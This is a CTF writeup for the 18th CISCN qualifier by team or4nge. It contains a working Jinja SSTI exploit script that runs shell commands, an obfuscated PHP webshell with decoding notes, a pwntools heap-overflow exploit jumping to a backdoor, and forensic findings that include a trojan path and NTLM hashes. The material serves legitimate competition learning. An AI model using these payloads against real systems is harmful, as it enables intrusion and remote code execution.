---
title: ciscn-18
titleTemplate: ':title | Writeups - or4nge'
layout: doc
---

# 第十八届 CISCN 初赛 Writeup by or4nge

::: info
**Rank: 84**
:::

## Web

### Safe_Proxy

普通的 ssti，利用根路由中的`open`，将结果写入源码文件。

```python
import requests

payload="{{''['_'+'_class_'+'_']['_'+'_mro_'+'_'][1]['_'+'_subclasses_'+'_']()}}"
target="http://47.94.104.233:32863/"
ind =0
for i in range(200):
    payload = f"{{{{''['_'+'_class_'+'_']['_'+'_mro_'+'_'][1]['_'+'_subclasses_'+'_']()[{i}]['_'+'_init_'+'_']['_'+'_globals_'+'_']['o'+'s']}}}}"
    rep= requests.post(target,data={'code':payload})
    if 'ok' in rep.text:
        ind = i
        print(rep.text)
        print(i,rep.status_code)
        break

payload =f"{{{{''['_'+'_class_'+'_']['_'+'_mro_'+'_'][1]['_'+'_subclasses_'+'_']()[{ind}]['_'+'_init_'+'_']['_'+'_globals_'+'_']['_'+'_builtins_'+'_']['exec']('_'+'_imp'+'ort_'+'_(\\'o'+'s\\').s'+'ystem(\\'cat /flag >> `ls *.py`\\')')}}}}"
rep = requests.post(target,data={'code':payload})
rep = requests.get(target)
print(rep.text)
```

### hello_web

通过测试可以发现其在 find 处最多传入 14 个字符，否则会回显`NAVIE`但是如果 payload 中存在`../`的时候可以多三个字符，怀疑进行替换，同时根据 html 中注释可以知道路径为`../hackme.php`，尝试双写绕过`?file=....//hackme.php`读到源码：

```php
<?php
highlight_file(__FILE__);
$lJbGIY="eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME";$OlWYMv="zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel";$lapUCm=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$YwzIst=$lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};$OxirhK=$lapUCm{33}.$lapUCm{10}.$lapUCm{24}.$lapUCm{10}.$lapUCm{24};$YpAUWC=$OxirhK{0}.$lapUCm{18}.$lapUCm{3}.$OxirhK{0}.$OxirhK{1}.$lapUCm{24};$rVkKjU=$lapUCm{7}.$lapUCm{13};$YwzIst.=$lapUCm{22}.$lapUCm{36}.$lapUCm{29}.$lapUCm{26}.$lapUCm{30}.$lapUCm{32}.$lapUCm{35}.$lapUCm{26}.$lapUCm{30};eval($YwzIst("JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="));
?>
```

解混淆可以知道 RCE 代码为`<?php @eval($_POST['cmd_66.99'])?>`，根据 php 特性可以知道连接密码`cmd[66.99`

bypass disable functions 后 find 找 flag 即可：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_0.png)

## Pwn

### anote

存在越界写和后门，可以通过 edit 触发：

```python
from pwn import *
from pwn import u32, u64, p32, p64
import sys

context.log_level = "debug"
context.arch = "i386"
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) < 2:
    debug = True
else:
    debug = False
# libc = ELF("./libc.so.6")
elf = ELF("./note")
if debug:
    p = process("./note")
else:
    p = remote(sys.argv[1], int(sys.argv[2]), ssl=False)

def ru(x): return p.recvuntil(x)
def sn(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def uu32(x): return u32(x.ljust(4, b'\0'))
def uu64(x): return u64(x.ljust(8, b'\0'))

def debug(b=0):
    if debug:
        if b:
            gdb.attach(p, "b *0x8048AB1")
        else:
            gdb.attach(p)

def menu(choice):
    p.recvuntil(b'Choice>>')
    p.sendline(str(choice).encode())

def add():
    menu(1)

def show(index):
    menu(2)
    p.sendlineafter(b'index:', str(index).encode())
    p.recvuntil(b'gift: ')
    addr = int(p.recvline().strip().decode(), 16)
    return addr

def edit(index, content):
    menu(3)
    p.sendlineafter(b'index:', str(index).encode())
    p.sendlineafter(b'len:', str(len(content) + 1).encode())
    p.sendlineafter(b'content:', content)

backdoor = 0x80489CE
add()
add()
add()
add()
addr1 = show(1)
info("addr1: " + hex(addr1))
edit(0, 2 * p64(0) + p32(0) + p32(0x21) + p32(backdoor))
edit(2, 2 * p64(0) + p32(0) + p32(0x21) + p32(addr1))
edit(3, b'a')
p.interactive()
```

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_1.png)

## Reverse

### ezCsky

用 cutter 可以反汇编，能看出密钥和密文

但是解不对，观察结果发现是前一个异或了后一个：

```python
import itertools
def KSA(key):
    """ Key-Scheduling Algorithm (KSA) """
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S
 
def PRGA(S):
    """ Pseudo-Random Generation Algorithm (PRGA) """
    i, j = 0, 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        yield K
 
def RC4(key, text):
    """ RC4 encryption/decryption """
    S = KSA(key)
    keystream = PRGA(S)
    res = []
    for char in text:
        res.append(char ^ next(keystream))
    return bytes(res)
key = b'testkey'
hex_data = [
    0x96, 0x8f, 0xb8, 0x08, 0x5d, 0xa7, 0x68, 0x44, 
    0xf2, 0x64, 0x92, 0x64, 0x42, 0x7a, 0x78, 0xe6, 
    0xea, 0xc2, 0x78, 0xb8, 0x63, 0x9e, 0x5b, 0x3d, 
    0xd9, 0x28, 0x3f, 0xc8, 0x73, 0x06, 0xee, 0x6b, 
    0x8d, 0x0c, 0x4b, 0xa3, 0x23, 0xae, 0xca, 0x40, 
    0xed, 0xd1
]
plaintext = bytes(hex_data)
ciphertext = RC4(key, plaintext)
ciphertext  = list(ciphertext)
for i in range(len(ciphertext)-1):
    ciphertext[41-i-1] ^= ciphertext[41-i] 
print(bytes(ciphertext))
```

### dump

一个简单的一对一编码 

直接全部输给程序让其 print 可得到对应关系

但是 0 可能有多解，题目给出了为 4

```python
from base64 import b64encode,b64decode
key = [
    0xD9D8DBA7,
    0xDDDCDFDE,
    0xD1D0D3D2,
    0xD5D4D7D6,
    0xC9C8CBCA,
    0xCDCCCFCE,
    0xABC0C3C2,
    0xF9F8FBA8,
    0xFDFCFFFE,
    0xF1F0F3F2,
    0xF5F4F7F6,
    0xE9E8EBEA,
    0xEDECEFEE,
    0xE1E0E3E2
]
print(key[0].to_bytes(4,byteorder='little'))
flag = [0x23,0x29,0x1e,0x24,0x38,0x0e,0x15,0x20,0x37,0x0e,0x05,0x20,0x00,0x0e,0x37,0x12,0x1d,0x0f,0x24,0x01,0x01,0x39]
for i in range(len(flag)):
    if flag[i] >= 0x1e and flag[i] <= 0x37:
        flag[i] = flag[i] - 0x1e + ord('a')
    elif flag[i] >= 0x2 and flag[i] <= 0x1b:
        flag[i] = flag[i] - 0x02 + ord('A')
    elif flag[i] == 0x1c:
        flag[i] = ord('1')
    elif flag[i] == 0x1d:
        flag[i] = ord('2')
    else:
        flag[i] = ord("!")
print(bytes(flag))
# MTczMDc4MzQ2Ng==
```

## Misc

### zeroshell

1. 找到对应命令执行的流量包，Referer 头解 base64

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_2.png)

2. 在 `/DB/_DB.001/flag` 中找到 flag

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_3.png)

木马程序为 `/tmp/.nginx` ，逆向分析即可解后几题：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_4.png)

1.  `flag{202.115.89.103}`
2.  `flag{.nginx}`
3.  `flag{11223344qweasdzxc}`

### WinFT

在机器中存在一个恶意流量包

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_5.png)

可以知道flag为`flag{miscsecure.com:192.168.116.130:443}`

### sc05

查询目的地址得到时间

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_6.png)

### Kiwi

流量中找到传输部分流量，掐头去尾得到：

```Plain
l1Mvs8wZ1LI/v3Vup1zF8bzdp1B51zz0e0xdfIXNBQMOe1wFEg+Z03ljczfC1qGdp0Y6bWnJ7rUqnQrZmVT9nFPRXqYpURBxuBKInjI5Q2xVgs56q4VRCQWbiyv00Aw7D0CKEotHSy6sQAC1x3T9wDx6xPCioqx/0nwNgrvJnF1Oq7NFZsVpnAxaZC5BVfKSEttFPjYgv3uSfmtxeJg7pPCHmJ8qf/Sd7W7n3gKSB2BELb==
```

同时逆向程序可以得到 base64 码表：

```Plain
d+F3DwWj8tUckVGZb57S1XsLqfm0vnpeMEzQ2Bg/PTrohxluiJCRIYAyH6N4aKO9
```

其使用 https://github.com/snaphat/InfinityEngineBetterRandom 生成随机数，通过调试 patch 掉输入和指令后在进行解密：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_7.png)

解得：

```Plain
User=Administrator
NTLM=
User=DefaultAccount
NTLM=
User=Guest
NTLM=
User=Lihua
NTLM=23d1e086b85cc18587bbc8c33adefe07
User=WDAGUtilityAccount
NTLM=d3280b38985c05214dcc81b74dd98b4f
```

破解 NTLM：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/ciscn-18/img_8.png)